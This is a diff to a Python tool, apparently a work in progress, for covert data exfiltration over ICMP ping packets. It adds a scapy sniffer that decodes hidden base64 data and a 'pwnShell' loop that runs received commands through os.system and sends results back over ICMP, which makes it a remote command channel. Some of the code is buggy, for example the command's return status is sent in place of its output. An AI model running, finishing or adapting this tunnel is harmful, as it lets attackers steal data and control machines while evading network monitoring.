@@ -1,6 +1,6 @@
-import os, sys, base64
+import os, sys, base64, argparse
 from time import sleep
-import argparse
+from scapy.all import *
 
 # different methods of exfiltration:
 # - time-based (server and client pre-establish time diff, maybe pattern)
@@ -18,6 +18,30 @@ def dataFile(filename):
     f.close()
 
     return content
+
+def raw(p):
+    return p[ICMP][Raw].load[16:32]
+
+def isICMP(p):
+    return p.haslayer(ICMP) and p[ICMP].type==8
+
+
+def lastBytesCommunication(interface):
+    s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
+              stop_filter = lambda packet : isICMP(packet) and '\n' in raw(packet))
+
+    buf = [raw(i) for i in s]
+
+    # if interface is loopback for testing purposes,
+    # each packet is duplicated so we need to remove it
+
+    if interface == "lo":
+        buf = [buf[i] for i in range(len(buf)) if i % 2 == 0]
+
+    buf = ''.join(buf)
+    dec = base64.b64decode(buf[:buf.find('\n')])
+
+    return dec
 
 # - data-based (remaining bytes - more noisy)
 def exfiltrateLastBytes(data, ip, src):
@@ -66,6 +90,50 @@ def exfiltrateTimeBased(data, ip, src):
     print "[*] Message sent to {}".format(ip)
     os.system("ping -c1 -p {} {} > /dev/null".format("0a", ip))
 
+def server(interface, mode):
+
+    received = []
+
+    for x in range(1):
+
+        if mode == 1:
+            data = lastBytesCommunication(interface)
+        elif mode == 2:
+            data = timeBasedCommunication(interface)
+        else:
+            return
+
+        print "[*] Received data: \"{}\"".format(data)
+        received.append(data)
+
+    return "\n".join(received) + "\n"
+
+def pwnShell(interface, mode, receiver):
+
+    while True:
+        if receiver:
+            data = server("lo", 1)
+            cmd = os.system(data)
+            exfiltrateLastBytes(cmd, "127.0.0.1", "")
+        else:
+            exfiltrateLastBytes("whoami", "127.0.0.1", "")
+            data = ""
+            while data == "":
+                data = server("lo", 1)
+            print data
+
+    """
+
+    client connects to server
+
+    server sends command as client, client replies sending back data
+
+    # both need to send and receive (communication both ways)
+
+    """
+
+    pass
+
 if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(description='Client that sends data disguised in ICMP packets. Keep in mind settings need to be the same for the server')
@@ -87,7 +155,11 @@ if __name__ == "__main__":
 
     ip = args.dest
 
-    if args.mode == 1:
-        exfiltrateLastBytes(data, ip, args.file)
-    elif args.mode == 2:
-        exfiltrateTimeBased(data, ip, args.file)
+    """
+    if 1:
+        if args.mode == 1:
+            exfiltrateLastBytes(data, ip, args.file)
+        elif args.mode == 2:
+            exfiltrateTimeBased(data, ip, args.file)
+    """
+    pwnShell(data, ip, 0)
